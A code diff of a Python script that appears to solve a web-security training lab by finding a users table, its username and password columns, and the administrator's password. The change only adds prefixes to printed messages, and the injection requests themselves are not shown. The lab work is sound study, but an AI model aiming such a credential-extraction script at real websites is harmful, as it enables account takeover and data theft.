@@ -12,11 +12,11 @@ def find_users_table(url):
         if users_table:
             return users_table
         else:
-            print("Something went wrong. Please check your url and try again")
+            print("(-) Something went wrong. Please check your url and try again")
             sys.exit(1)
 
     except requests.exceptions.RequestException as e:
-        print(f"An error has occurred: {e}")
+        print(f"(-) An error has occurred: {e}")
         sys.exit(1)
 
 
@@ -37,20 +37,20 @@ def get_admin_password(url, users_table, username_column, password_column):
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: python3 {sys.argv[0]} <url>")
-        print(f"Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
+        print(f"(+) Usage: python3 {sys.argv[0]} <url>")
+        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
     url = sys.argv[1].rstrip("/")
 
     users_table = find_users_table(url)
-    print(f"Users table: {users_table}")
+    print(f"(+) Users table: {users_table}")
 
     username_column, password_column = get_column_names(url, users_table)
-    print(f"Username column: {username_column}\nPassword column: {password_column}")
+    print(f"(+) Username column: {username_column}\n(+) Password column: {password_column}")
 
     admin_password = get_admin_password(url, users_table, username_column, password_column)
-    print(f"Administrator password: {admin_password}")
+    print(f"(+) Administrator password: {admin_password}")
 
 
 if __name__ == "__main__":
